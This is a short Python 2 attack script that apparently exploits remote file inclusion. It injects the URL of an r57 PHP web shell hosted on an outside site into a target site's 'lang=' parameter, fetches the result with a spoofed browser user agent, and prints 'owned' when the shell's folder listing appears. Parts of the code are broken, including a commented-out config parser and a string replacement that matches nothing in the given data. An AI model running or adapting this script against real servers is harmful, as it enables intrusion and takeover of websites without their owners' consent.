import urllib2

def wget(url):
  opener = urllib2.build_opener(url)
  opener.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')]
  data = opener.open(url).read()
  return data





##fs=open('config.txt','r')
##while 1:
##  txt=fs.readline()
##  txt.strip()
##  if txt=='':
##    break
##  if txt[0] !='#':
##    if txt.find('url=') != -1:
##       txt.strip()
##      print txt[:len('url=')]
##    if txt.find('keyword=') != -1:
##      print txt[:len('keyword=')]

###fd=open("phps.txt","r")
###data=fd.readlines()
data=['www.mandrakeroot.nl/inside/index.php?lang=']
for i in data:
    url=i.replace("[path]", 'http://antihackerlink.or.id/r57.txt?')
    print "[+] "+url
    try:
        data=wget('http://'+url)
        data=data.replace('\r\n','\n')
        if data.find('Listing folder') != -1:
            print i + ': owned'
            print data

    except:
        pass


    
